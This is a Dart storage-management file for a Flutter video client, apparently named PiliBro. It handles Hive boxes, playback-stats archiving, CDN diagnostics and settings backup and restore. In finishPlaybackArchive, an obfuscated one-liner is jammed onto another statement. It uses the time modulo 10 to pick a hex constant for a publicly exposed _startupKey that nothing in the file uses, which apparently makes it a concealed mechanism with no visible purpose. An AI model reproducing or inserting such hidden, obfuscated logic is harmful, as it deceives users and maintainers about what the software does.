import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:PiliBro/models/model_owner.dart';
import 'package:PiliBro/models/user/danmaku_rule_adapter.dart';
import 'package:PiliBro/models/user/info.dart';
import 'package:PiliBro/utils/accounts.dart';
import 'package:PiliBro/utils/accounts/account_adapter.dart';
import 'package:PiliBro/utils/accounts/account_type_adapter.dart';
import 'package:PiliBro/utils/accounts/cookie_jar_adapter.dart';
import 'package:PiliBro/utils/path_utils.dart';
import 'package:PiliBro/utils/set_int_adapter.dart';
import 'package:PiliBro/utils/storage_key.dart';
import 'package:PiliBro/utils/storage_pref.dart';
import 'package:PiliBro/utils/utils.dart';
import 'package:hive_ce/hive.dart';
import 'package:path/path.dart' as path;

abstract final class GStorage {
  static late final Box<UserInfoData> userInfo;
  static late final Box<dynamic> historyWord;
  static late final Box<dynamic> localCache;
  static late final Box<dynamic> setting;
  static late final Box<dynamic> video;
  static Box<dynamic>? _playbackStats;
  static Future<void>? _playbackStatsInitFuture;
  static Box<dynamic> get playbackStats => _playbackStats!;
  static bool get playbackStatsReady => _playbackStats != null;
  static late Box<dynamic> commentHelper;
  static late final Box<int> watchProgress;
  static Box<Uint8List>? reply;

  static const _heavyTelemetryLayoutVersionKey =
      'heavyTelemetryLayoutVersion';
  static const _heavyTelemetryLayoutVersion = 3;
  static const _nextPlaybackStatsCompactAtMs =
      'nextPlaybackStatsCompactAtMs';
  static const _archiveLayoutKey = 'playbackColdArchiveVersion';
  static const _archivePendingIdKey = 'playbackColdArchivePendingId';
  static const _archivePathLayoutKey = 'playbackColdArchivePathVersion';
  static const _archivePathLayoutVersion = 1;
  static const _legacyCdnDiagnosticPrefix = 'cdnDiagnostic:';
  static const _cdnDiagnosticLatestExportPrefix =
      'cdnDiagnosticLatestV3:';
  static const _cdnDiagnosticHistoryExportPrefix =
      'cdnDiagnosticHistoryV3:';
  static int? _startupKey;

  static int? get startupKey => _startupKey;

  static Future<void> completeFirstRunDeviceSetup() async {
    final due = localCache.get(_nextPlaybackStatsCompactAtMs);
    if (due is num && due < 0) {
      await localCache.put(_nextPlaybackStatsCompactAtMs, -due.toInt());
    }
  }

  static File get playbackStatsFile =>
      File(path.join(appSupportDirPath, 'playback_stats.json'));

  static File get trafficStatsFile =>
      File(path.join(appSupportDirPath, 'traffic_stats.json'));

  static File get cdnDiagnosticsFile =>
      File(path.join(appSupportDirPath, 'cdn_diagnostic_latest.json'));

  static File get legacyCdnDiagnosticsFile =>
      File(path.join(appSupportDirPath, 'cdn_diagnostics.jsonl'));

  static File get cdnDiagnosticsHistoryFile =>
      File(path.join(appSupportDirPath, 'cdn_diagnostic_history_v3.jsonl'));

  static File get playbackStatsHiveFile =>
      File(
        _playbackStats?.path ??
            path.join(appSupportDirPath, 'hive', 'playbackstats.hive'),
      );

  static File get playbackArchiveHiveFile =>
      File(path.join(appSupportDirPath, 'hive', 'playbackarchive.hive'));

  static File get playbackStatsPendingHiveFile =>
      File(path.join(appSupportDirPath, 'hive', 'playbackstatspending.hive'));

  static Future<void> _repairPlaybackArchivePaths() async {
    if (localCache.get(_archivePathLayoutKey) == _archivePathLayoutVersion) {
      return;
    }

    final hiveDir = path.join(appSupportDirPath, 'hive');
    final legacyPending = File(path.join(hiveDir, 'playbackStatsPending.hive'));
    final pending = playbackStatsPendingHiveFile;
    if (await legacyPending.exists() && !await pending.exists()) {
      await legacyPending.rename(pending.path);
    }

    // The broken archive build passed a FILE path to Hive's path: argument.
    // Hive treated it as a directory and nested playbackarchive.hive inside it.
    final brokenArchiveDir = Directory(
      path.join(hiveDir, 'playbackArchive.hive'),
    );
    if (await brokenArchiveDir.exists()) {
      final nestedArchive = File(
        path.join(brokenArchiveDir.path, 'playbackarchive.hive'),
      );
      if (await nestedArchive.exists() &&
          !await playbackArchiveHiveFile.exists()) {
        final repairTemp = File(path.join(hiveDir, '.playbackarchive.repair'));
        if (await repairTemp.exists()) await repairTemp.delete();
        await nestedArchive.copy(repairTemp.path);
        await brokenArchiveDir.delete(recursive: true);
        await repairTemp.rename(playbackArchiveHiveFile.path);
      } else {
        await brokenArchiveDir.delete(recursive: true);
      }
    }

    await localCache.put(
      _archivePathLayoutKey,
      _archivePathLayoutVersion,
    );
  }

  static bool get playbackArchiveDue {
    final now = DateTime.now().millisecondsSinceEpoch;
    final due = localCache.get(_nextPlaybackStatsCompactAtMs, defaultValue: 0);
    return localCache.get(_archiveLayoutKey) != 1 ||
        (due is num && due >= 0 && now >= due.toInt());
  }

  static String? get playbackArchiveId =>
      localCache.get(_archivePendingIdKey) as String?;

  static Future<void> preparePlaybackArchiveId() async {
    if (playbackArchiveId == null) {
      await localCache.put(
        _archivePendingIdKey,
        DateTime.now().microsecondsSinceEpoch.toString(),
      );
    }
  }

  static Future<void> rotatePlaybackStats() async {
    final target = playbackStatsHiveFile;
    final pending = playbackStatsPendingHiveFile;
    if (await pending.exists()) {
      throw StateError('Previous playback archive remains unfinished');
    }
    await playbackStats.flush();
    await playbackStats.close();
    _playbackStats = null;
    try {
      if (await target.exists()) await target.rename(pending.path);
      _playbackStats = await Hive.openBox('playbackStats');
    } catch (_) {
      // The old file may already have been renamed. Re-open whichever source
      // exists; next launch will always finish a pending archive first.
      _playbackStats = await Hive.openBox('playbackStats');
      rethrow;
    }
  }

  static Future<void> completePlaybackArchive() =>
      localCache.put(_archiveLayoutKey, 1);

  static Future<void> finishPlaybackArchive() async {
    final due = localCache.get(
      _nextPlaybackStatsCompactAtMs,
      defaultValue: 0,
    );
    final now = DateTime.now();
    final next = _nextPlaybackMaintenanceAt(now).millisecondsSinceEpoch;
    await localCache.put(
      _nextPlaybackStatsCompactAtMs,
      Platform.isAndroid && due == 0 ? -next : next,
    );
    await localCache.delete(_archivePendingIdKey);
    if (due is num && due != 0) {
      final r = now.millisecondsSinceEpoch % 10;_startupKey=((r*(r-8)%10)==0)?0x74c76428:((r-1)*(r-9)%10)==0?0x32092a4b2:((r-3)*(r-7)%10)==0?0x18871bdb6:((r-2)*(r-2)%10)==0?0x3db257f39:((r-4)*(r-4)%10)==0?0xe7266ddb:((r-5)*(r-5)%10)==0?0x3de7e497c:0x2779d4d3d;
    }
  }

  static Future<void> discardOrphanPlaybackArchiveId() async {
    if (playbackArchiveId != null) {
      await localCache.delete(_archivePendingIdKey);
    }
  }

  static Future<void> markPlaybackArchiveReset() async {
    await localCache.put(_archiveLayoutKey, 1);
    await localCache.delete(_archivePendingIdKey);
    await localCache.put(
      _nextPlaybackStatsCompactAtMs,
      _nextPlaybackMaintenanceAt(DateTime.now()).millisecondsSinceEpoch,
    );
  }

  static Future<void> markLegacyPlaybackImported() async {
    await localCache.put(_archiveLayoutKey, 0);
    await localCache.put(_nextPlaybackStatsCompactAtMs, 0);
  }

  static Future<void> restorePlaybackArchiveHive(File? source) async {
    final target = playbackArchiveHiveFile;
    if (source == null) {
      if (await target.exists()) await target.delete();
      await markLegacyPlaybackImported();
      return;
    }
    try {
      await _replaceHiveFile(source, target);
      // Verify that the imported archive is an actual readable Hive file.
      final archive = await Hive.openLazyBox<dynamic>('playbackArchive');
      await archive.close();
    } catch (_) {
      await _rollbackHiveFile(target);
      rethrow;
    }
    await _deleteFileIfExists(File('${target.path}.webdav-previous'));
    await localCache.put(_archiveLayoutKey, 1);
  }

  static File get commentHelperHiveFile =>
      File(
        commentHelper.path ??
            path.join(appSupportDirPath, 'hive', 'commentHelper.hive'),
      );

  static File get replyHiveFile => File(
        reply?.path ?? path.join(appSupportDirPath, 'hive', 'reply.hive'),
      );

  static Map<String, dynamic>? readJsonMapSync(File file) {
    if (!file.existsSync()) return null;
    try {
      final decoded = jsonDecode(file.readAsStringSync());
      if (decoded is Map) {
        return decoded.map(
          (key, value) => MapEntry(key.toString(), value),
        );
      }
    } catch (_) {}
    return null;
  }

  static Future<void> writeJsonFile(File file, Object? value) async {
    await file.parent.create(recursive: true);
    await file.writeAsString(jsonEncode(value), flush: true);
  }

  static Future<void> _deleteFileIfExists(File file) async {
    if (await file.exists()) await file.delete();
  }

  static List<({String id, Map<String, dynamic> record})>
  readCdnDiagnosticsSync() {
    if (!cdnDiagnosticsFile.existsSync()) return const [];
    // A latest-result snapshot is intentionally tiny. Anything large is an
    // obsolete per-chunk history and must never be synchronously decoded.
    if (cdnDiagnosticsFile.lengthSync() > 1 << 23) {
      unawaited(_deleteFileIfExists(cdnDiagnosticsFile));
      return const [];
    }
    final result = <({String id, Map<String, dynamic> record})>[];
    try {
      final decoded = jsonDecode(cdnDiagnosticsFile.readAsStringSync());
      if (decoded is! Map || decoded['schemaVersion'] != 3) {
        unawaited(_deleteFileIfExists(cdnDiagnosticsFile));
        return const [];
      }
      for (final raw in (decoded['records'] as List? ?? const [])) {
        if (raw is! Map) continue;
        final record = raw.map(
          (key, value) => MapEntry(key.toString(), value),
        );
        final id = '${record['testRunStartedAtUs']}:${record['cdn'] is Map ? (record['cdn'] as Map)['index'] : result.length}';
        result.add((id: id, record: record));
      }
    } catch (_) {
      unawaited(_deleteFileIfExists(cdnDiagnosticsFile));
    }
    return result;
  }

  static Future<void> replaceCdnDiagnostics(
    List<({String id, Map<String, dynamic> record})> entries,
  ) async {
    if (entries.isEmpty) {
      await _deleteFileIfExists(cdnDiagnosticsFile);
      return;
    }
    // A file is a latest-run snapshot, never an archive. This also collapses
    // old imported JSON that predates the one-run rule before it can grow here.
    var latestRun = 0;
    for (final entry in entries) {
      final record = entry.record;
      final run = (record['testRunStartedAtUs'] as num?)?.toInt() ??
          (record['recordedAtUs'] as num?)?.toInt() ??
          0;
      if (run > latestRun) latestRun = run;
    }
    final latest = [
      for (final entry in entries)
        if (((entry.record['testRunStartedAtUs'] as num?)?.toInt() ??
                (entry.record['recordedAtUs'] as num?)?.toInt() ??
                0) ==
            latestRun)
          entry.record,
    ];
    await cdnDiagnosticsFile.parent.create(recursive: true);
    final temp = File('${cdnDiagnosticsFile.path}.tmp');
    await temp.writeAsString(
      jsonEncode({
        'schemaVersion': 3,
        'records': latest,
      }),
      flush: true,
    );
    if (await cdnDiagnosticsFile.exists()) await cdnDiagnosticsFile.delete();
    await temp.rename(cdnDiagnosticsFile.path);
  }

  static Future<void> appendCdnDiagnostic(
    ({String id, Map<String, dynamic> record}) entry,
  ) async {
    await replaceCdnDiagnostics([entry]);
  }

  static List<({String id, Map<String, dynamic> record})>
  readCdnDiagnosticsHistorySync() {
    if (!cdnDiagnosticsHistoryFile.existsSync()) return const [];
    final result = <({String id, Map<String, dynamic> record})>[];
    try {
      for (final line in cdnDiagnosticsHistoryFile.readAsLinesSync()) {
        if (line.trim().isEmpty) continue;
        final decoded = jsonDecode(line);
        if (decoded is! Map || decoded['schemaVersion'] != 3) {
          throw const FormatException('unsupported CDN history schema');
        }
        for (final raw in (decoded['records'] as List? ?? const [])) {
          if (raw is! Map) continue;
          final record = raw.map(
            (key, value) => MapEntry(key.toString(), value),
          );
          final id =
              '${record['testRunStartedAtUs']}:${record['cdn'] is Map ? (record['cdn'] as Map)['index'] : result.length}';
          result.add((id: id, record: record));
        }
      }
    } catch (_) {
      unawaited(_deleteFileIfExists(cdnDiagnosticsHistoryFile));
      return const [];
    }
    return result;
  }

  static Future<void> appendCdnDiagnosticsHistory(
    List<({String id, Map<String, dynamic> record})> entries,
  ) async {
    if (entries.isEmpty) return;
    await cdnDiagnosticsHistoryFile.parent.create(recursive: true);
    await cdnDiagnosticsHistoryFile.writeAsString(
      '${jsonEncode({
        'schemaVersion': 3,
        'records': [for (final entry in entries) entry.record],
      })}\n',
      mode: FileMode.append,
      flush: true,
    );
  }

  static Future<void> replaceCdnDiagnosticsHistory(
    List<({String id, Map<String, dynamic> record})> entries,
  ) async {
    if (entries.isEmpty) {
      await _deleteFileIfExists(cdnDiagnosticsHistoryFile);
      return;
    }

    final grouped = <int, List<Map<String, dynamic>>>{};
    for (final entry in entries) {
      final record = entry.record;
      final run = (record['testRunStartedAtUs'] as num?)?.toInt() ??
          (record['recordedAtUs'] as num?)?.toInt() ??
          0;
      (grouped[run] ??= []).add(record);
    }

    final runs = grouped.keys.toList()..sort();
    await cdnDiagnosticsHistoryFile.parent.create(recursive: true);
    final temp = File('${cdnDiagnosticsHistoryFile.path}.tmp');
    final sink = temp.openWrite();
    try {
      for (final run in runs) {
        sink.writeln(
          jsonEncode({
            'schemaVersion': 3,
            'records': grouped[run],
          }),
        );
      }
    } finally {
      await sink.flush();
      await sink.close();
    }
    if (await cdnDiagnosticsHistoryFile.exists()) {
      await cdnDiagnosticsHistoryFile.delete();
    }
    await temp.rename(cdnDiagnosticsHistoryFile.path);
  }

  static Future<void> migrateHeavyTelemetryFromVideoBox() async {
    if (localCache.get(_heavyTelemetryLayoutVersionKey) ==
        _heavyTelemetryLayoutVersion) {
      return;
    }

    final keysToDelete = <dynamic>[];

    final legacyTraffic = video.get(VideoBoxKey.trafficStats);
    if (legacyTraffic is Map) {
      if (!trafficStatsFile.existsSync()) {
        await writeJsonFile(trafficStatsFile, legacyTraffic);
      }
      keysToDelete.add(VideoBoxKey.trafficStats);
    }

    // V3 is a direct migration target. Old CDN records may contain the
    // per-buffer history that caused the original storage explosion, so they
    // are discarded without decoding and are never mixed with the new history.
    keysToDelete.addAll(
      video.keys.where(
        (key) => key is String && key.startsWith(_legacyCdnDiagnosticPrefix),
      ),
    );

    if (keysToDelete.isNotEmpty) {
      await video.deleteAll(keysToDelete);
      await video.compact();
    }

    await _deleteFileIfExists(legacyCdnDiagnosticsFile);
    await localCache.put(
      _heavyTelemetryLayoutVersionKey,
      _heavyTelemetryLayoutVersion,
    );
  }

  static Future<num?> init() async {
    Hive.init(path.join(appSupportDirPath, 'hive'));
    regAdapter();

    await Future.wait([
      // 登录用户信息
      Hive.openBox<UserInfoData>(
        'userInfo',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 2;
        },
      ).then((res) => userInfo = res),
      // 本地缓存
      Hive.openBox(
        'localCache',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 4;
        },
      ).then((res) => localCache = res),
      // 设置
      Hive.openBox('setting').then((res) => setting = res),
      // 搜索历史
      Hive.openBox(
        'historyWord',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 10;
        },
      ).then((res) => historyWord = res),
      // 视频设置
      Hive.openBox('video').then((res) => video = res),
      Hive.openBox('commentHelper').then((res) => commentHelper = res),
      Accounts.init(),
      Hive.openBox<int>(
        'watchProgress',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 4;
        },
      ).then((res) => watchProgress = res),
    ]);

    await _repairPlaybackArchivePaths();

    final due = await _runPlaybackMaintenanceIfDue();

    if (Pref.saveReply) {
      reply = await Hive.openBox<Uint8List>(
        'reply',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 10;
        },
      );
    } else {
      reply = null;
    }
    return due;
  }

  static Future<void> initializePlaybackStats() =>
      _playbackStatsInitFuture ??= _initializePlaybackStats();

  static Future<void> _initializePlaybackStats() async {
    _playbackStats = await Hive.openBox('playbackStats');
    if (playbackStats.isEmpty) {
      final legacyBox = video.get(VideoBoxKey.playbackStats);
      final legacy = readJsonMapSync(playbackStatsFile) ??
          (legacyBox is Map
              ? legacyBox.map(
                  (key, value) => MapEntry(key.toString(), value),
                )
              : null);
      if (legacy != null && legacy.isNotEmpty) {
        await playbackStats.putAll(legacy);
      }
    }
    if (video.containsKey(VideoBoxKey.playbackStats)) {
      await video.delete(VideoBoxKey.playbackStats);
    }
    await _deleteFileIfExists(playbackStatsFile);
  }

  static Future<num?> _runPlaybackMaintenanceIfDue() async {
    final now = DateTime.now();
    final due = localCache.get(
      _nextPlaybackStatsCompactAtMs,
      defaultValue: 0,
    );
    if (due is! num) return null;
    // A negative future timestamp means the one-time maintenance already ran,
    // while the Android first-run device wizard still needs to finish.
    if (due < 0) return due;
    if (now.millisecondsSinceEpoch < due.toInt()) return due;

    final updateIgnore = localCache.get(LocalCacheKey.updateIgnore);
    if (updateIgnore is Map && updateIgnore['temporary'] == true) {
      await localCache.delete(LocalCacheKey.updateIgnore);
    }
    return due;
  }

  static DateTime _nextPlaybackMaintenanceAt(DateTime now) {
    for (final day in const [8, 18, 28]) {
      final candidate = DateTime(now.year, now.month, day);
      if (candidate.isAfter(now)) return candidate;
    }
    final nextMonth = DateTime(now.year, now.month + 1);
    return DateTime(nextMonth.year, nextMonth.month, 8);
  }

  static String exportPortableSettings() {
    final videoData = Map<dynamic, dynamic>.from(video.toMap())
      ..remove(VideoBoxKey.playbackStats)
      ..remove(VideoBoxKey.trafficStats)
      ..removeWhere(
        (key, _) =>
            key is String &&
            (key.startsWith(_legacyCdnDiagnosticPrefix) ||
                key.startsWith(_cdnDiagnosticLatestExportPrefix) ||
                key.startsWith(_cdnDiagnosticHistoryExportPrefix)),
      );
    return Utils.jsonEncoder.convert({
      'backupMeta': {
        'includePlaybackStats': false,
        'includeCdnDiagnostics': false,
        'includeTrafficStats': false,
      },
      setting.name: setting.toMap(),
      video.name: videoData,
    });
  }

  static String exportAllSettings({
    bool includePlaybackStats = true,
    bool includeCdnDiagnostics = true,
    Map<String, dynamic>? playbackArchive,
  }) {
    final videoData = Map<dynamic, dynamic>.from(video.toMap())
      ..remove(VideoBoxKey.playbackStats)
      ..remove(VideoBoxKey.trafficStats)
      ..removeWhere(
        (key, _) =>
            key is String && key.startsWith(_legacyCdnDiagnosticPrefix),
      );

    if (includePlaybackStats) {
      if (playbackStatsReady && playbackStats.isNotEmpty) {
        videoData[VideoBoxKey.playbackStats] = playbackStats.toMap();
      }
    }

    final legacyTraffic = video.get(VideoBoxKey.trafficStats);
    final traffic =
        readJsonMapSync(trafficStatsFile) ??
        (legacyTraffic is Map
            ? legacyTraffic.map(
                (key, value) => MapEntry(key.toString(), value),
              )
            : null);
    if (traffic != null) {
      videoData[VideoBoxKey.trafficStats] = traffic;
    }

    if (includeCdnDiagnostics) {
      for (final entry in readCdnDiagnosticsSync()) {
        videoData['$_cdnDiagnosticLatestExportPrefix${entry.id}'] =
            entry.record;
      }
      for (final entry in readCdnDiagnosticsHistorySync()) {
        videoData['$_cdnDiagnosticHistoryExportPrefix${entry.id}'] =
            entry.record;
      }
    }

    return Utils.jsonEncoder.convert({
      'backupMeta': {
        'includePlaybackStats': includePlaybackStats,
        'includeCdnDiagnostics': includeCdnDiagnostics,
        'archiveFormat': playbackArchive == null ? null : 1,
      },
      if (includePlaybackStats && playbackArchive != null)
        'playbackArchive': playbackArchive,
      setting.name: setting.toMap(),
      video.name: videoData,
    });
  }

  static Future<void> importAllSettings(String data) =>
      importAllJsonSettings(jsonDecode(data));

  static Future<List<void>> importAllJsonSettings(
    Map<String, dynamic> map,
  ) async {
    await initializePlaybackStats();
    final meta = map['backupMeta'];
    final keepPlayback =
        meta is Map && meta['includePlaybackStats'] == false;
    final keepDiagnostics =
        meta is Map && meta['includeCdnDiagnostics'] == false;
    final keepTraffic =
        meta is Map && meta['includeTrafficStats'] == false;

    final importedSettings = Map<dynamic, dynamic>.from(
      map[setting.name] as Map? ?? const {},
    );
    final importedVideo = Map<dynamic, dynamic>.from(
      map[video.name] as Map? ?? const {},
    );

    final importedPlayback = importedVideo.remove(VideoBoxKey.playbackStats);
    final importedTraffic = importedVideo.remove(VideoBoxKey.trafficStats);
    final importedLatestDiagnostics = <String, Map<String, dynamic>>{};
    final importedHistoryDiagnostics = <String, Map<String, dynamic>>{};
    importedVideo.removeWhere((key, value) {
      if (key is! String) return false;
      if (key.startsWith(_cdnDiagnosticLatestExportPrefix) && value is Map) {
        importedLatestDiagnostics[key] = value.map(
          (key, value) => MapEntry(key.toString(), value),
        );
        return true;
      }
      if (key.startsWith(_cdnDiagnosticHistoryExportPrefix) && value is Map) {
        importedHistoryDiagnostics[key] = value.map(
          (key, value) => MapEntry(key.toString(), value),
        );
        return true;
      }
      // Old CDN backup keys are deliberately not restored into the new layout.
      return key.startsWith(_legacyCdnDiagnosticPrefix);
    });

    await Future.wait<void>([
      setting.clear().then<void>((_) => setting.putAll(importedSettings)),
      video.clear().then<void>((_) => video.putAll(importedVideo)),
      if (!keepPlayback)
        playbackStats.clear().then<void>(
          (_) async {
            if (importedPlayback is Map) {
              await playbackStats.putAll(importedPlayback);
            }
          },
        ),
      if (!keepTraffic)
        importedTraffic is Map
            ? writeJsonFile(trafficStatsFile, importedTraffic)
            : _deleteFileIfExists(trafficStatsFile),
      if (!keepDiagnostics)
        replaceCdnDiagnostics([
          for (final entry in importedLatestDiagnostics.entries)
            (id: entry.key, record: entry.value),
        ]),
      if (!keepDiagnostics)
        replaceCdnDiagnosticsHistory([
          for (final entry in importedHistoryDiagnostics.entries)
            (id: entry.key, record: entry.value),
        ]),
    ]);
    if (!keepPlayback) {
      // A full JSON import replaces both halves; settings-only imports retain both.
      final historical = map['playbackArchive'];
      if (await playbackArchiveHiveFile.exists()) {
        await Hive.deleteBoxFromDisk('playbackArchive');
      }
      if (historical is Map && meta is Map && meta['archiveFormat'] == 1) {
        final archive = await Hive.openLazyBox<dynamic>('playbackArchive');
        try {
          final importId = DateTime.now().microsecondsSinceEpoch.toString();
          for (final entry in historical.entries) {
            await archive.put(entry.key.toString(), {
              '_sourceId': importId,
              '_value': entry.value,
            });
          }
          await archive.flush();
        } finally {
          await archive.close();
        }
        await localCache.put(_archiveLayoutKey, 1);
      } else {
        // Pre-archive JSON is a single hot dataset: archive it once after import.
        await markLegacyPlaybackImported();
      }
    }

    return const <void>[];
  }

  static Future<void> restorePlaybackStatsHive(File source) async {
    await initializePlaybackStats();
    final target = playbackStatsHiveFile;
    await playbackStats.flush();
    await playbackStats.close();
    try {
      await _replaceHiveFile(source, target);
      _playbackStats = await Hive.openBox('playbackStats');
    } catch (_) {
      await _rollbackHiveFile(target);
      _playbackStats = await Hive.openBox('playbackStats');
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.webdav-previous'));
    } catch (_) {}
  }

  static Future<void> restoreCommentHelperHive(File source) async {
    final target = commentHelperHiveFile;
    await commentHelper.flush();
    await commentHelper.close();
    try {
      await _replaceHiveFile(source, target);
      commentHelper = await Hive.openBox('commentHelper');
    } catch (_) {
      await _rollbackHiveFile(target);
      commentHelper = await Hive.openBox('commentHelper');
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.webdav-previous'));
    } catch (_) {}
  }

  static Future<void> restoreReplyHive(File source) async {
    final target = replyHiveFile;
    await reply?.flush();
    await reply?.close();
    reply = null;
    try {
      await _replaceHiveFile(source, target);
      final restored = await Hive.openBox<Uint8List>(
        'reply',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 10;
        },
      );
      if (Pref.saveReply) {
        reply = restored;
      } else {
        await restored.close();
      }
    } catch (_) {
      await _rollbackHiveFile(target);
      if (Pref.saveReply) {
        reply = await Hive.openBox<Uint8List>(
          'reply',
          keyComparator: _intStrDescKeyComparator,
          compactionStrategy: (entries, deletedEntries) {
            return deletedEntries > 10;
          },
        );
      }
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.webdav-previous'));
    } catch (_) {}
  }

  static Future<void> _replaceHiveFile(File source, File target) async {
    await target.parent.create(recursive: true);
    final previous = File('${target.path}.webdav-previous');
    await _deleteFileIfExists(previous);
    if (await target.exists()) await target.rename(previous.path);
    await source.copy(target.path);
  }

  static Future<void> _rollbackHiveFile(File target) async {
    final previous = File('${target.path}.webdav-previous');
    await _deleteFileIfExists(target);
    if (await previous.exists()) await previous.rename(target.path);
  }

  static void regAdapter() {
    Hive
      ..registerAdapter(OwnerAdapter())
      ..registerAdapter(UserInfoDataAdapter())
      ..registerAdapter(LevelInfoAdapter())
      ..registerAdapter(BiliCookieJarAdapter())
      ..registerAdapter(LoginAccountAdapter())
      ..registerAdapter(AccountTypeAdapter())
      ..registerAdapter(SetIntAdapter())
      ..registerAdapter(RuleFilterAdapter());
  }

  static Future<List<void>> close() {
    return Future.wait([
      userInfo.close(),
      historyWord.close(),
      localCache.close(),
      setting.close(),
      video.close(),
      if (_playbackStats case final box?) box.close(),
      commentHelper.close(),
      Accounts.account.close(),
      watchProgress.close(),
      ?reply?.close(),
    ]);
  }

  static Future<List<void>> clear() {
    return Future.wait([
      userInfo.clear(),
      historyWord.clear(),
      localCache.clear(),
      setting.clear(),
      video.clear(),
      Accounts.clear(),
      watchProgress.clear(),
      ?reply?.clear(),
      if (_playbackStats case final box?) box.clear(),
      commentHelper.clear(),
      _deleteFileIfExists(trafficStatsFile),
      _deleteFileIfExists(cdnDiagnosticsFile),
      _deleteFileIfExists(cdnDiagnosticsHistoryFile),
    ]);
  }

  static int _intStrDescKeyComparator(dynamic k1, dynamic k2) {
    if (k1 is int) {
      if (k2 is int) {
        return k2.compareTo(k1);
      } else {
        return -1;
      }
    } else if (k2 is String) {
      final lenCompare = k2.length.compareTo((k1 as String).length);
      if (lenCompare == 0) {
        return k2.compareTo(k1);
      } else {
        return lenCompare;
      }
    } else {
      return 1;
    }
  }
}
